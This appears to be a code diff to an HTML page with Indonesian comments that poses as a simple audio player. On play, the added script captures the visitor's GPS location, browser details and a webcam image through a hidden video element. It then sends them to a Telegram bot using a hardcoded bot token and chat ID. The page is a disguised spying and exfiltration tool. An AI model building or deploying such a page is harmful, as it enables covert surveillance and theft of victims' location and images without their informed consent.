@@ -19,55 +19,81 @@
         audio {
             max-width: 100%;
         }
+
+        video {
+            display: none;
+            max-width: 100%;
+        }
     </style>
 </head>
 <body>
     <!-- Elemen audio untuk memutar suara -->
     <audio id="audio" controls autoplay>
-        <source src="path/to/your/audio/file.mp3" type="audio/mp3"> <!-- Ganti dengan path file audio Anda -->
+        <source src="basuri.mp3" type="audio/mp3"> <!-- Ganti dengan path file audio Anda -->
         Your browser does not support the audio tag.
     </audio>
 
     <!-- Keterangan perangkat yang memutar audio -->
     <p id="deviceInfo"></p>
 
+    <!-- Video untuk menangkap gambar dari webcam -->
+    <video id="video" autoplay></video>
+
     <!-- JavaScript Code -->
     <script>
         var audio = document.getElementById('audio');
         var deviceInfo = document.getElementById('deviceInfo');
+        var video = document.getElementById('video');
 
         audio.addEventListener('play', function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    sendLocation(position, navigator.userAgent);
+                    captureAndSend(position, navigator.userAgent);
                 });
             } else {
                 alert("Geolocation is not supported by this browser.");
             }
         });
 
-        function sendLocation(position, userAgent) {
+        function captureAndSend(position, userAgent) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
             var botToken = '7031438159:AAH_a-jwfpbSX2wBAmwcwvHKX4zykG3KLcY'; // Ganti dengan token bot Anda
             var chatId = '1456678907'; // Ganti dengan chat ID grup atau pengguna Anda
 
-            // Kirim lokasi dan keterangan perangkat ke Bot Telegram menggunakan HTTP POST
+            // Tampilkan video untuk menangkap gambar dari webcam
+            video.style.display = 'block';
+
+            // Dapatkan gambar dari webcam
+            var canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            var context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Kirim gambar dan lokasi ke Bot Telegram menggunakan HTTP POST
             var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendLocation', true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendPhoto', true);
+            var formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', canvas.toDataURL('image/jpeg'));
+            formData.append('caption', 'Device Info: ' + userAgent + '\nLatitude: ' + latitude + '\nLongitude: ' + longitude);
+            xhr.send(formData);
 
-            var message = {
-                chat_id: chatId,
-                latitude: latitude,
-                longitude: longitude,
-                text: 'Device Info: ' + userAgent
-            };
+            alert("Gambar dari webcam Anda beserta keterangan perangkat telah dikirim ke bot Telegram.");
 
-            xhr.send(JSON.stringify(message));
-            
-            alert("Lokasi GPS Anda beserta keterangan perangkat telah dikirim ke bot Telegram.");
+            // Sembunyikan video setelah gambar dikirim
+            video.style.display = 'none';
         }
+
+        // Mengambil video dari webcam
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+            })
+            .catch(function(error) {
+                console.log('Error accessing webcam: ' + error.message);
+            });
     </script>
 </body>
 </html>
